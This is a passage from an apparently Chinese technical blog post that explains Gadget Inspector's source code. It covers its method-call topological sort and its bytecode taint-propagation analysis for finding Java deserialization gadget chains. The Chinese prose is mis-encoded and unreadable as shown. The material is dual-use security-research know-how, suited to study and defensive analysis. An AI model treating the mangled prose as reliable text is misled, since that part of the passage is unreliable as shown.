å…¥ï¼Œæ•…brä¼šè¢«arg1æ±¡æŸ“ï¼Œå³æ–¹æ³•açš„è¿”å›å€¼ä¼šè¢«æ–¹æ³•açš„å‚æ•°arg1æ±¡æŸ“ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">a</span><span class="params">(String arg1)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">br</span> <span class="operator">=</span> b(arg1);</span><br><span class="line">        <span class="keyword">return</span> br;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">b</span><span class="params">(String arg2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> arg2 + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å¯ä»¥å°†ä¸åŒçš„æ–¹æ³•çœ‹ä½œä¸åŒçš„ç‚¹ï¼Œæ‰€æœ‰çš„æ–¹æ³•æ„æˆä¸€ä¸ªç‚¹é›†ï¼Œå°†æ–¹æ³•çš„è°ƒç”¨å…³ç³»çœ‹ä½œè¾¹ï¼Œè°ƒç”¨è€…ä½œä¸ºèµ·ç‚¹ï¼Œè¢«è°ƒç”¨è€…ä½œä¸ºç»ˆç‚¹ä»è€Œå½¢æˆä¸€ä¸ªæœ‰å‘çš„è¾¹é›†å½¢æˆä¸€ä¸ªæœ‰å‘å›¾ã€‚<br>å› ä¸º Java æ–¹æ³•è°ƒç”¨çš„ç‰¹æ®Šæ€§ï¼Œå…¶å¾€å¾€å­˜åœ¨å„ç§å¾ªç¯è°ƒç”¨ï¼Œå…¸å‹çš„å°±æ˜¯é€’å½’è°ƒç”¨ï¼Œæ•…æ–¹æ³•è°ƒç”¨å›¾å¹¶ä¸æ˜¯ä¸€ä¸ªå…¸å‹çš„æœ‰å‘æ— ç¯å›¾ã€‚ä¸€èˆ¬æ¥è¯´è¿™æ ·çš„å›¾æ˜¯ä¸èƒ½è¿›è¡Œæ‹“æ‰‘æ’åºçš„ï¼Œ<br>ä¸è¿‡ Gadget Inspector é€šè¿‡å¼•å…¥ä¸­é—´å˜é‡å¹¶å¢åŠ é€»è¾‘åˆ¤æ–­çš„æ–¹å¼æ¥é¿å…äº†è¿™ä¸ªé—®é¢˜ã€‚  </p>
<h6 id="å¦‚ä½•å¯¹æ–¹æ³•è°ƒç”¨è¿›è¡Œæ‹“æ‰‘æ’åº"><a href="#å¦‚ä½•å¯¹æ–¹æ³•è°ƒç”¨è¿›è¡Œæ‹“æ‰‘æ’åº" class="headerlink" title="å¦‚ä½•å¯¹æ–¹æ³•è°ƒç”¨è¿›è¡Œæ‹“æ‰‘æ’åº"></a>å¦‚ä½•å¯¹æ–¹æ³•è°ƒç”¨è¿›è¡Œæ‹“æ‰‘æ’åº</h6><p>åœ¨å‰ä¸€èŠ‚ä¸­é€šè¿‡ discoverMethodCalls æ–¹æ³•çš„è°ƒç”¨è·å–äº†ä¸€ä¸ªä»¥ MethodReference.Handle æ–¹æ³•å¥æŸ„ä¸ºKeyï¼ŒSet&lt;MethodReference.Handle&gt; ä¸ºå€¼çš„ä¸€ä¸ªMapå¹¶èµ‹å€¼ç»™å˜é‡methodCallsã€‚<br>åœ¨è¿›è¡Œæ‹“æ‰‘æ’åºæ˜¯é¦–å…ˆå°†methodCallså˜é‡çš„å€¼è¿›è¡Œæ‹·è´åˆ° outgoingReferences ä¸­ï¼Œç„¶åå®šä¹‰äº†ä¸‰ä¸ªå˜é‡ dfsStackï¼ŒvisitNodesï¼ŒsortedMethods<br>åˆ†åˆ«ç”¨äºè®°å½•æœç´¢æ ˆï¼Œå·²è®¿é—®èŠ‚ç‚¹é›†åˆï¼Œä»¥åŠæœ€ç»ˆçš„æ’åºç»“æœé›†åˆã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;MethodReference.Handle&gt; topologicallySortMethodCalls() &#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodCalls.entrySet()) &#123;</span><br><span class="line">            MethodReference.<span class="type">Handle</span> <span class="variable">method</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            outgoingReferences.put(method, <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(entry.getValue()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Topological sort methods</span></span><br><span class="line">        LOGGER.debug(<span class="string">&quot;Performing topological sort...&quot;</span>);</span><br><span class="line">        Set&lt;MethodReference.Handle&gt; dfsStack = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        Set&lt;MethodReference.Handle&gt; visitedNodes = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        List&lt;MethodReference.Handle&gt; sortedMethods = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(outgoingReferences.size());</span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle root : outgoingReferences.keySet()) &#123;</span><br><span class="line">            dfsTsort(outgoingReferences, sortedMethods, visitedNodes, dfsStack, root);</span><br><span class="line">        &#125;</span><br><span class="line">        LOGGER.debug(String.format(<span class="string">&quot;Outgoing references %d, sortedMethods %d&quot;</span>, outgoingReferences.size(), sortedMethods.size()));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sortedMethods;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>stack å˜é‡æ˜¯ç”¨æ¥è·Ÿè¸ªæ–¹æ³•è°ƒç”¨æ·±åº¦çš„æ ˆï¼Œæ¯å½“å‘ç”Ÿæ–¹æ³•è°ƒç”¨æ—¶ä¾¿å°†è¯¥æ–¹æ³•å‹å…¥åˆ°æ ˆä¸­ï¼Œå½“æ–¹æ³•è°ƒç”¨ç»“æŸæ—¶å°†è¯¥æ–¹æ³•ä»æ ˆä¸­å¼¹å‡ºï¼Œå½“æ ˆä¸ºç©ºæ—¶è¡¨ç¤ºä¸€æ¬¡æ’åºç»“æŸã€‚<br>visitedNodes å˜é‡ç”¨äºè¡¨ç¤ºå½“å‰èŠ‚ç‚¹å·²ç»è¢«è®¿é—®è¿‡äº†ï¼Œå½“æŸä¸ªèŠ‚ç‚¹å‡ºç°åœ¨visitedNotesä¸­æ—¶å°†ä¸å¿…ç»§ç»­è¿›è¡Œé€’å½’è€Œæ˜¯ç›´æ¥è¿”å›ï¼Œå› ä¸ºè¯¥èŠ‚ç‚¹å·²ç»è¢«æ’åºå­˜å‚¨åˆ° sortedMethods ä¸­ã€‚<br>é€šè¿‡ visitedNodes é›†åˆçš„å¼•å…¥ï¼ŒGadget Inspector æœ‰æ•ˆåœ°é¿å…äº†æœ‰å‘å›¾æ‹“æ‰‘æ’åºè¿‡ç¨‹ä¸­ç¯çš„é—®é¢˜ã€‚<br>sortedMethods å­˜å‚¨æœ€ç»ˆçš„æ’åºç»“æœï¼Œæ‰€æœ‰çš„æ–¹æ³•éƒ½å°†è¢«å­˜å‚¨åœ¨è¯¥åˆ—è¡¨ä¸­ã€‚<br>åœ¨æ•´ä¸ªæ’åºè¿‡ç¨‹ä¸­ stack å˜é‡å¯èƒ½ä¸ºç©ºï¼Œå› ä¸ºå…¶åªå­˜å‚¨äº†ä¸€æ¬¡æ–¹æ³•è°ƒç”¨æ’åºçš„å †æ ˆå˜åŒ–å…³ç³»ï¼Œå½“å½“å‰æ–¹æ³•è°ƒç”¨ç»“æŸå stack å˜é‡ä¸ºç©ºï¼Œåˆ™è¡¨ç¤ºä¸€æ¬¡æ’åºç»“æŸã€‚<br>visitedNodes è¿‡ç¨‹ä¸­ä¸ä¼šä¸ºç©ºè€Œæ˜¯ä¸æ–­åœ°å¢é•¿ï¼Œå› ä¸ºå…¶å­˜å‚¨çš„æ˜¯æ‰€æœ‰è¢«è®¿é—®è¿‡çš„æ–¹æ³•ï¼Œéšç€æ’åºçš„è¿›è¡Œå…¶å®¹é‡ä¼šä¸æ–­æ‰©å¤§ã€‚sortedMethods åˆ—è¡¨ä¼šéšç€æ’åºçš„è¿›è¡Œå¢é•¿ï¼Œå› ä¸ºå…¶å­˜å‚¨çš„æ˜¯æ’åºçš„ç»“æœã€‚<br>visitedNodes é›†åˆçš„å¼•å…¥æ˜¯ä¸ºäº†å¤„ç†æœ‰å‘å›¾ä¸­å‡ºç°çš„ç¯çš„é—®é¢˜ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">dfsTsort</span><span class="params">(Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences,</span></span><br><span class="line"><span class="params">                                    List&lt;MethodReference.Handle&gt; sortedMethods, Set&lt;MethodReference.Handle&gt; visitedNodes,</span></span><br><span class="line"><span class="params">                                    Set&lt;MethodReference.Handle&gt; stack, MethodReference.Handle node)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (stack.contains(node)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (visitedNodes.contains(node)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Set&lt;MethodReference.Handle&gt; outgoingRefs = outgoingReferences.get(node);</span><br><span class="line">        <span class="keyword">if</span> (outgoingRefs == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        stack.add(node);</span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle child : outgoingRefs) &#123;</span><br><span class="line">            dfsTsort(outgoingReferences, sortedMethods, visitedNodes, stack, child);</span><br><span class="line">        &#125;</span><br><span class="line">        stack.remove(node);</span><br><span class="line">        visitedNodes.add(node);</span><br><span class="line">        sortedMethods.add(node);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h5 id="æ„é€ æ•°æ®ä¼ æ’­æµå›¾"><a href="#æ„é€ æ•°æ®ä¼ æ’­æµå›¾" class="headerlink" title="æ„é€ æ•°æ®ä¼ æ’­æµå›¾"></a>æ„é€ æ•°æ®ä¼ æ’­æµå›¾</h5><p>æœ¬èŠ‚æ˜¯ Gadget Inspector çš„ç²¾åï¼Œå®ƒé€šè¿‡é™æ€æ¨¡æ‹Ÿç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­å±€éƒ¨å˜é‡è¡¨ä»¥åŠæ“ä½œæ•°æ ˆçš„å˜æ¢æ¥è¿›è¡Œæ±¡ç‚¹åˆ†æï¼Œä»è€Œç¡®è®¤æ–¹æ³•å…¥å‚ä¸è¿”å›å€¼ä¹‹é—´çš„å…³ç³»ã€‚<br>åœ¨ä¸‹é¢çš„æ–¹æ³•ä¸­é¦–å…ˆå¯¹ <clinit> æ–¹æ³•åšäº†æ’é™¤ï¼Œå› ä¸ºå®ƒæ˜¯ç±»çš„æ„é€ æ–¹æ³•ï¼Œåœ¨ç±»çš„åŠ è½½è¿‡ç¨‹ä¸­ç”±JVMæ‰§è¡Œï¼Œè´Ÿè´£ç±»é™æ€ä»£ç å—çš„æ‰§è¡Œä»¥åŠç±»æˆå‘˜å˜é‡çš„åˆå§‹åŒ–ç­‰æ“ä½œã€‚<br>è¯¥è¿‡ç¨‹ä¸å—æ”»å‡»è€…æ§åˆ¶ã€‚<br>ç„¶åé€šè¿‡æ–¹æ³•å¥æŸ„è·å–åˆ°å…¶æ‰€å±ç±»å¹¶è¯»å–è¯¥ç±»çš„å­—èŠ‚ç æµï¼Œå¹¶ä½¿ç”¨ PassthroughDataflowClassVisitor å¯¹å­—èŠ‚ç æµè¿›è¡Œè§£æã€‚ PassthroughDataflowClassVisitor æ˜¯ä¸€ä¸ª ClassVisitorï¼Œ<br>å…¶ visitMethod ä¼šä¾æ¬¡å¤„ç†è¯¥ç±»çš„æ‰€æœ‰æ–¹æ³•ï¼Œå¹¶ä½¿ç”¨ MethodVisitor å¯¹æ–¹æ³•è¿›è¡Œè§£æã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; calculatePassthroughDataflow(Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName,</span><br><span class="line">                                                                                          Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span><br><span class="line">                                                                                          InheritanceMap inheritanceMap,</span><br><span class="line">                                                                                          List&lt;MethodReference.Handle&gt; sortedMethods,</span><br><span class="line">                                                                                          SerializableDecider serializableDecider) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : sortedMethods) &#123;</span><br><span class="line">            <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;&lt;clinit&gt;&quot;</span>)) &#123; </span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ClassResourceEnumerator.<span class="type">ClassResource</span> <span class="variable">classResource</span> <span class="operator">=</span> classResourceByName.get(method.getClassReference().getName());</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> classResource.getInputStream()) &#123;</span><br><span class="line">                <span class="type">ClassReader</span> <span class="variable">cr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(inputStream);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">PassthroughDataflowClassVisitor</span> <span class="variable">cv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PassthroughDataflowClassVisitor</span>(classMap, inheritanceMap,</span><br><span class="line">                            passthroughDataflow, serializableDecider, Opcodes.ASM6, method);</span><br><span class="line">                    cr.accept(cv, ClassReader.EXPAND_FRAMES);</span><br><span class="line">                     passthroughDataflow.put(method, cv.getReturnTaint());</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    LOGGER.error(<span class="string">&quot;Exception analyzing &quot;</span> + method.getClassReference().getName(), e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Unable to analyze &quot;</span> + method.getClassReference().getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> passthroughDataflow;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>PassthroughDataflowMethodVisitor æ˜¯ä¸€ä¸ª MethodVisitorï¼Œå…¶ä¼šè®¿é—®ä¸€ä¸ªæ–¹æ³•è°ƒç”¨çš„å„ç§ä¿¡æ¯ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc,</span></span><br><span class="line"><span class="params">        String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="comment">// è®¿é—®æŒ‡å®šçš„æ–¹æ³•   æ–¹æ³•åä¸æ–¹æ³•æè¿°ç¬¦å¿…é¡»ä¸€è‡´  é¿å…æ–¹æ³•é‡è½½å¸¦æ¥çš„å†²çª</span></span><br><span class="line">        <span class="keyword">if</span> (!name.equals(methodToVisit.getName()) || !desc.equals(methodToVisit.getDesc())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (passthroughDataflowMethodVisitor != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Constructing passthroughDataflowMethodVisitor twice!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">        <span class="comment">// è®¿é—®ç±»çš„æŸä¸€ä¸ªæ–¹æ³•çš„è¯¦ç»†ä¿¡æ¯</span></span><br><span class="line">        passthroughDataflowMethodVisitor = <span class="keyword">new</span> <span class="title class_">PassthroughDataflowMethodVisitor</span>(</span><br><span class="line">        classMap, inheritanceMap, <span class="built_in">this</span>.passthroughDataflow, serializableDecider,</span><br><span class="line">        api, mv, <span class="built_in">this</span>.name, access, name, desc, signature, exceptions);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JSRInlinerAdapter</span>(passthroughDataflowMethodVisitor, access, name, desc, signature, exceptions);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>PassthroughDataflowMethodVisitor ç»§æ‰¿è‡ª TaintTrackingMethodVisitor ä¸¤è€…ä¸€åŒå®ç°äº†æ“ä½œæ•°æ ˆä»¥åŠå±€éƒ¨å˜é‡è¡¨çš„é™æ€æ¨¡æ‹Ÿã€‚<br>PassthroughDataflowMethodVisitor ä¸»è¦è´Ÿè´£æ±¡ç‚¹ä¼ æ’­åˆ†æï¼Œ TaintTrackingMethodVisitor ä¸»è¦è´Ÿè´£åœ¨åˆ†æè¿‡ç¨‹ä¸­è°ƒæ•´æ“ä½œæ•°æ ˆä»¥åŠå±€éƒ¨å˜é‡è¡¨ã€‚<br>åœ¨ MethodVisitor ä¸­é’ˆå¯¹å­—èŠ‚ç ä¸åŒçš„è¡Œä¸ºå‡æœ‰ç›¸åº”çš„æ–¹æ³•è¿›è¡Œå¤„ç†ï¼Œå¦‚å½“æ–¹æ³•ä¸­å‡ºç°æ— æ“ä½œæ•°å­—èŠ‚ç è°ƒç”¨æ—¶ï¼Œå¦‚ï¼šRETURN, IRETURN, ATHROWï¼Œå°†ä¼šè§¦å‘ visitInsn æ–¹æ³•è°ƒç”¨ï¼Œ<br>å½“å‡ºç°æ–¹æ³•è°ƒç”¨æŒ‡ä»¤æ—¶ï¼Œå¦‚ï¼š INVOKEVIRTUAL, INVOKESPECIAL, INVOKESTATIC, INVOKEINTERFACE ï¼Œå°†è§¦å‘ visitMethodInsn æ–¹æ³•è°ƒç”¨ã€‚<br>Gadget Inspector å°†åœ¨å¯¹åº”çš„æ–¹æ³•ä¸­åŒæ­¥è®°å½•è¿™äº›æŒ‡ä»¤è°ƒç”¨æ—¶æ“ä½œæ•°æ ˆä»¥åŠå±€éƒ¨å˜é‡è¡¨çš„å˜åŒ–æƒ…å†µã€‚<br>ä¸‹é¢æˆ‘ä»¬å°†é€šè¿‡å‡ ä¸ªæ–¹æ³•çš„è°ƒç”¨ä¸¾ä¾‹å±•ç¤ºï¼ŒGadget Inspector æ—¶å¦‚ä½•è¿›è¡Œæ¨¡æ‹Ÿçš„ã€‚  </p>
<p>visitCode æ–¹æ³•æ˜¯æœ€å…ˆè¢«æ‰§è¡Œçš„æ–¹æ³•ï¼Œå…¶å°†è´Ÿè´£å±€éƒ¨å˜é‡è¡¨ç©ºé—´çš„å¼€è¾Ÿï¼Œå¹¶è®¾ç½®ç›¸åº”çš„æ±¡ç‚¹ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitCode</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="comment">// å¼€è¾Ÿå±€éƒ¨å˜é‡è¡¨ç©ºé—´</span></span><br><span class="line">            <span class="built_in">super</span>.visitCode();</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">localIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">argIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// è®¾ç½®æ±¡ç‚¹  ä¹Ÿå¯ä»¥ç†è§£æˆè®¾ç½®å½¢å‚åœ¨å±€éƒ¨å˜é‡è¡¨ä¸­çš„ä½ç½® å½¢æˆçš„æ•°æ®ç±»ä¼¼</span></span><br><span class="line">            <span class="comment">// å‡å¦‚æœ‰è¿™æ ·ä¸€ä¸ªå®ä¾‹æ–¹æ³•</span></span><br><span class="line">            <span class="comment">// (String,long,int)</span></span><br><span class="line">            <span class="comment">// å¯¹åº”çš„å±€éƒ¨å˜é‡è¡¨ä¸º long çš„ç´¢å¼•ä¸º2 å æ®ä¸¤ä¸ªæ§½ä½</span></span><br><span class="line">            <span class="comment">// | 0 | 1 | 2 |   | 3 |</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="built_in">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// ç¬¬0ä¸ªå±€éƒ¨å˜é‡è¢«ç¬¬0ä¸ªå‚æ•°æ±¡æŸ“</span></span><br><span class="line">                setLocalTaint(localIndex, argIndex);</span><br><span class="line">                localIndex += <span class="number">1</span>;</span><br><span class="line">                argIndex += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// ä¾æ¬¡ç±»æ¨ è®¾ç½®å‚æ•°çš„æ±¡æŸ“ æ ¹æ®å‚æ•°çš„ç±»å‹è°ƒæ•´å±€éƒ¨å˜é‡è¡¨ç´¢å¼•ï¼Œå› ä¸º long Double ç±»å‹å æ®ä¸¤ä¸ªæ§½ä½</span></span><br><span class="line">            <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">                setLocalTaint(localIndex, argIndex);</span><br><span class="line">                localIndex += argType.getSize();</span><br><span class="line">                argIndex += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>PassthroughDataflowMethodVisitor çˆ¶ç±» TaintTrackingMethodVisitor çš„ visitCode æ–¹æ³•ï¼Œä¸»è¦ä½œç”¨æ˜¯å¼€è¾Ÿå±€éƒ¨å˜é‡è¡¨ç©ºé—´ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.visitCode();</span><br><span class="line">        savedVariableState.localVars.clear();</span><br><span class="line">        savedVariableState.stackVars.clear();</span><br><span class="line">        <span class="comment">// æ–¹æ³•çš„è®¿é—®ä¿®é¥°ç¬¦éƒ¨ä½ static  ä¸ºå±€éƒ¨å˜é‡è¡¨å¼€è¾Ÿä¸€ä¸ªç©ºé—´ å› ä¸ºå®ä¾‹æ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºthis, å æ®ä¸€ä¸ªæ§½ä½</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">            savedVariableState.localVars.add(<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;T&gt;());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ ¹æ®æ–¹æ³•æè¿°ç¬¦è·å–åˆ°å‚æ•°ç±»å‹ ä¸åŒçš„å‚æ•°ç±»å‹å æ®ä¸åŒçš„æ§½ä½ ä¸€èˆ¬çš„ç±»å‹ä¸º1ä¸ªæ§½ä½  long double å æ®ä¸¤ä¸ªæ§½ä½</span></span><br><span class="line">        <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">            <span class="comment">// æ ¹æ®å‚æ•°ç±»å‹å¼€è¾Ÿä¸åŒå¤§å°çš„ç©ºé—´</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argType.getSize(); i++) &#123;</span><br><span class="line">                savedVariableState.localVars.add(<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;T&gt;());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å½“æ–¹æ³•ä¸­å‡ºç°å­—æ®µè®¿é—®æ—¶ä¼šè°ƒç”¨ visitFieldInsn æ–¹æ³•  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitFieldInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc)</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">                <span class="comment">// é™æ€çš„æ“ä½œä¸äº†</span></span><br><span class="line">                <span class="keyword">case</span> Opcodes.GETSTATIC:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.PUTSTATIC:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">// ä»å­—æ®µå–å€¼</span></span><br><span class="line">                <span class="keyword">case</span> Opcodes.GETFIELD:</span><br><span class="line">                    <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> Type.getType(desc);</span><br><span class="line">                    <span class="comment">// å æ®ä¸€ä¸ªæ§½ä½çš„å­—æ®µ</span></span><br><span class="line">                    <span class="keyword">if</span> (type.getSize() == <span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="type">Boolean</span> <span class="variable">isTransient</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// If a field type could not possibly be serialized, it&#x27;s effectively transient</span></span><br><span class="line">                        <span class="comment">// åˆ¤æ–­å­—æ®µæ˜¯å¦èƒ½å®ä¾‹åŒ– ç»å…¸javaåºåˆ—åŒ–çš„æ¡ä»¶ æ˜¯ å®ç°äº†serializeæ¥å£ä¸”ç±»å‹æ²¡æœ‰åœ¨é»‘åå•ä¸­</span></span><br><span class="line">                        <span class="comment">// å¦‚æœä¸èƒ½è¢«åºåˆ—åŒ– åˆ™ isTransient æ ‡è®°ä¸ºtrue</span></span><br><span class="line">                        <span class="keyword">if</span> (!couldBeSerialized(serializableDecider, inheritanceMap, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(type.getInternalName()))) &#123;</span><br><span class="line">                            isTransient = Boolean.TRUE;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="type">ClassReference</span> <span class="variable">clazz</span> <span class="operator">=</span> classMap.get(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner));</span><br><span class="line">                            <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="comment">// è·å–å½“å‰å­—æ®µæ‰€å±ç±» çš„æ‰€æœ‰æˆå‘˜å˜é‡ è¿›è¡Œéå†</span></span><br><span class="line">                                <span class="keyword">for</span> (ClassReference.Member member : clazz.getMembers()) &#123;</span><br><span class="line">                                    <span class="comment">// å¦‚æœå½“å‰å­—æ®µæ‰€å±ç±»çš„æˆå‘˜å˜é‡ä¸å½“å‰å­—æ®µç›¸ç­‰</span></span><br><span class="line">                                    <span class="keyword">if</span> (member.getName().equals(name)) &#123;</span><br><span class="line">                                        <span class="comment">// å¦‚æœå½“å‰å­—æ®µæ˜¯è¢«transientä¿®é¥° åˆ™è¢«æ ‡è®°ä¸º   isTransient</span></span><br><span class="line">                                        isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != <span class="number">0</span>;</span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span> (isTransient != <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="comment">// çˆ¶ç±»ä¹Ÿè¦è¢«æ‰¾ä¸€é å¤šæ€çš„åŸå› </span></span><br><span class="line">                                clazz = classMap.get(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(clazz.getSuperClass()));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        Set&lt;Integer&gt; taint;</span><br><span class="line">                        <span class="comment">// å­—æ®µå¦‚æœä¸æ˜¯ç¬æ€çš„ éœ€è¦ä»æ ˆä¸Šå»ä¸€ä¸ªå€¼</span></span><br><span class="line">                        <span class="comment">// getField ä¼šå…ˆä»æ ˆé¡¶å–å‡ºå¯¹è±¡çš„å¼•ç”¨</span></span><br><span class="line">                        <span class="keyword">if</span> (!Boolean.TRUE.equals(isTransient)) &#123;</span><br><span class="line">                            taint = getStackTaint(<span class="number">0</span>); <span class="comment">// åªå–ä¸åˆ </span></span><br><span class="line">                        &#125; <span class="keyword">else</span> 